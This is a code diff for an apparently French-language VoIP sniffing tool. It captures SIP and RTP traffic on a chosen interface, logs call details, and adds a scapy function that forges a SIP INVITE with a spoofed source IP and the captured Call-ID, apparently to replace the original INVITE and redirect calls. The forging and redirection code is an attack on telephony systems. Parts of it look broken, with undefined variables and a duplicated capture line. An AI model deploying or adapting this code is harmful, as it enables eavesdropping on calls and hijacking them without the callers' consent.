@@ -4,7 +4,9 @@ from console import getTerminalSize
 from os import system
 from re import search
 from datetime import datetime
-
+from scapy.layers import IP,UDP
+from random import randrange
+from scapy.all import send
 
 
 # BLACK
@@ -75,11 +77,16 @@ Created by Breee and Spectra
 ░  ░  ░  ░░       ▒ ▒ ░░     ░          ░   ▒     ░ ░     ░ ░   
       ░           ░ ░        ░ ░            ░  ░    ░  ░    ░  ░
                   ░ ░        ░                                  
-'''
-)
+''')
 
+k = interfaces()
+print(k)
+interface = str(input("Saisissez l'interface d'écoute : "))
+while interface not in k:
+    print(k)
+    interface = str(input("Saisissez une interface valide : "))
 
-print(interfaces)
+capture = LiveCapture(interface=interface, display_filter='sip or rtp')
 capture = LiveCapture(interface=input("Nom de l'interface: "), display_filter='sip or rtp')
 # print(capture.set_debug())
 format='%d/%m/%Y %H:%M:%S'
@@ -129,3 +136,29 @@ if item.endswith(".g711u") or len(item.split('.'))==5:remove(item)
 
 with open('infos_call.txt', 'w') as f:
     f.write("Date de début : {: >}\nDate de fin :   {: >}\nCall ID :       {}".format(start,end,CID))
+
+
+def redirect(new_sip=input('Nouveau SIP : '), new_ip=input('Nouvelle adresse IP : ')):
+
+    forged_packet =(
+        f'INVITE sip:{new_sip}@{new_ip};user=phone;uniq=E04784589605A88765A939C2CA2A7 SIP/2.0\r\n'
+        'Max-Forwards: 59\r\n'
+        f'Via: SIP/2.0/UDP {p['IP'].src}:5060;branch=z9hG4bKg3Zqkv7i1tg6jule4zo2e7ndqkj1zfut6\r\n'
+        f'To: "{new_sip}" <sip:{new_sip}@telekom.de;transport=udp;user=phone>\r\n'
+        f'From: <sip:{SIP1}@dtag-gn.de;transport=udp;user=phone>;tag=h7g4Esbg_p65557t1573829978m943109c168405915s1_3637842016-655695229\r\n'
+        f'Call-ID: {CID}\r\n'
+        'CSeq: 1 INVITE\r\n'
+        f'Contact: <sip:sgc_c@{p['IP'].src};transport=udp>;+g.3gpp.icsi-ref="urn%3Aurn-7%3A3gpp-service.ims.icsi.mmtel"\r\n'
+
+        f'a=rtpmap:101 telephone-event/{fs}\r\n'
+        ).format(new_ip)
+
+    ip = IP(src=p['IP'].src,dst=new_ip)
+
+    udp = UDP(sport = randrange(80,65535),dport=6789)
+
+    send(ip/udp/forged_packet)
+
+if p.method =='INVITE':
+    #on veut jeter le paquer INVITE original et envoyer le paquet INVITE forgé à la place
+    redirect()
